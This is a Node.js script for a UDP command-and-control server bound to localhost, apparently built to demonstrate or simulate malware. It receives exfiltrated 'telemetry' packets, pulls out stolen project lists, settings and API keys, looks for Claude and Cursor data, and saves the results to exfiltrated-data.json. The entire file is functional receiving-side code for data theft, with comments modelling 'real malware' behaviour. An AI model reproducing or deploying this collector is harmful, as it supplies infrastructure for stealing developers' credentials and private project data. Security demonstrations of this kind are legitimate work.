#!/usr/bin/env node

const dgram = require('dgram');
const chalk = require('chalk').default || require('chalk');
const fs = require('fs');

const server = dgram.createSocket('udp4');
let packetCount = 0;
let stolenDataLog = [];

server.on('error', (err) => {
  console.log(`Server error:\n${err.stack}`);
  server.close();
});

server.on('message', (msg, rinfo) => {
  packetCount++;
  console.log(chalk.red(`📡 INTERCEPTED PACKET #${packetCount}`));
  console.log(chalk.yellow(`   From: ${rinfo.address}:${rinfo.port} | Size: ${msg.length} bytes`));
  
  try {
    const dataStr = msg.toString();
    
    // Extract whatever JSON we can, even if truncated
    if (dataStr.includes('TELEMETRY_')) {
      const jsonStart = dataStr.indexOf('{');
      if (jsonStart !== -1) {
        try {
          // Try to parse the (potentially truncated) JSON
          const jsonData = JSON.parse(dataStr.substring(jsonStart));
          
          console.log(chalk.cyan(`   ⏰ Timestamp: ${new Date(jsonData.timestamp).toLocaleTimeString()}`));
          console.log(chalk.cyan(`   🖥️  Platform: ${jsonData.platform}`));
          
          // Show any stolen data we can extract
          if (jsonData.stolenData && Array.isArray(jsonData.stolenData)) {
            console.log(chalk.red(`   🚨 STOLEN DATA FOUND: ${jsonData.stolenData.length} items`));
            
            jsonData.stolenData.forEach((item, i) => {
              console.log(chalk.yellow(`   [${i+1}] ${item.source}`));
              
              if (item.data) {
                if (item.data.projects) {
                  console.log(chalk.magenta(`       📁 Projects: ${item.data.projects.slice(0,2).join(', ')}...`));
                }
                if (item.data.settings) {
                  const keys = Object.keys(item.data.settings);
                  console.log(chalk.cyan(`       ⚙️  Settings: ${keys.slice(0,3).join(', ')}...`));
                }
                if (item.data.credentials) {
                  console.log(chalk.red(`       🔑 API Keys: ${item.data.credentials.length} found!`));
                }
              }
            });
            
            // Log stolen data to file (like real malware would)
            stolenDataLog.push({
              timestamp: new Date().toISOString(),
              packet: packetCount,
              items: jsonData.stolenData.length,
              data: jsonData.stolenData
            });
          }
          
        } catch (parseError) {
          // JSON is truncated, show what we can
          console.log(chalk.red(`   ⚠️  TRUNCATED DATA (${msg.length} bytes)`));
          
          // Extract whatever text we can see
          const visibleText = dataStr.substring(jsonStart, jsonStart + 500);
          
          // Real malware would save whatever it can detect
          const detectedData = {
            timestamp: new Date().toISOString(),
            packet: packetCount,
            size: msg.length,
            detected: [],
            rawData: visibleText.substring(0, 200)
          };
          
          // Look for key indicators in the truncated data
          if (visibleText.includes('claude')) {
            console.log(chalk.yellow(`   🎯 CLAUDE DATA DETECTED`));
            detectedData.detected.push('claude_data');
          }
          if (visibleText.includes('cursor')) {
            console.log(chalk.yellow(`   🎯 CURSOR DATA DETECTED`));
            detectedData.detected.push('cursor_data');
          }
          if (visibleText.includes('projects')) {
            console.log(chalk.magenta(`   📁 PROJECT DATA DETECTED`));
            detectedData.detected.push('project_data');
          }
          if (visibleText.includes('settings')) {
            console.log(chalk.cyan(`   ⚙️  SETTINGS DATA DETECTED`));
            detectedData.detected.push('settings_data');
          }
          
          // Extract any visible file paths or identifiers
          const paths = visibleText.match(/[a-zA-Z0-9\-_\/\.]+/g);
          if (paths && paths.length > 0) {
            detectedData.extractedPaths = paths.slice(0, 5);
          }
          
          // Save truncated data - real malware would do this
          if (detectedData.detected.length > 0) {
            stolenDataLog.push(detectedData);
          }
          
          console.log(chalk.dim(`   📦 Partial: ${visibleText.substring(0,100)}...`));
        }
      }
    }
    
  } catch (e) {
    console.log(chalk.dim(`   📦 Raw binary data: ${msg.length} bytes`));
  }
  
  // Save to exfiltration log every 5 packets (realistic frequency)
  if (packetCount % 5 === 0 && stolenDataLog.length > 0) {
    try {
      fs.writeFileSync('exfiltrated-data.json', JSON.stringify(stolenDataLog, null, 2));
      console.log(chalk.green(`   💾 Saved ${stolenDataLog.length} stolen items to exfiltrated-data.json`));
    } catch (e) {
      // Ignore file errors
    }
  }
  
  console.log('');
});

server.on('listening', () => {
  const address = server.address();
  console.log(chalk.green(`🎯 Realistic C2 Server listening on ${address.address}:${address.port}`));
  console.log(chalk.dim('Receiving stolen data and saving to exfiltrated-data.json...\n'));
});

server.bind(41234, '127.0.0.1');